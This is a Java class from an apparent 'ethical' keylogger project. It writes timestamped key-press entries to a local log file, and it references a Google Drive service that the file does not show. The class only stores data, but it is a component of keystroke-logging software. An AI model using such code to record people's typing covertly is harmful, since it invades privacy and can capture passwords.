package com.mycompany.ethicaljavalogger.services;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.logging.Level;
import java.util.logging.Logger;

public class KeyboardLogService {
    private String fileName;
    
    public KeyboardLogService() {
        this.fileName = "keyboard_logs.txt";
        this.writeHeader();
    }
    
    public void writeInputLog(String input) {
        String dateTimeText = this.getCurrentDateTimeText();
        this.writeInFile(dateTimeText + "     " + input);
    }
    
    private void writeHeader() {
        File keyboardLogFile = new File(this.fileName);
        
        if (!keyboardLogFile.exists()) {
            this.writeInFile("Data e Hora             Tecla Pressionada");
            this.writeInFile("-------------------     -------------------");
        }
    }
    
    private void writeInFile(String textLine) {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(this.fileName, true))) {
            // O segundo parâmetro "true" indica que você deseja abrir o arquivo em modo de anexação
            writer.write(textLine + "\n");
        } catch (IOException ex) {
            Logger.getLogger(GoogleDriveService.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
    private String getCurrentDateTimeText() {
        LocalDateTime currentDateTime = LocalDateTime.now();
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("dd/MM/yyyy HH:mm:ss");
        return currentDateTime.format(formatter);
    }
}
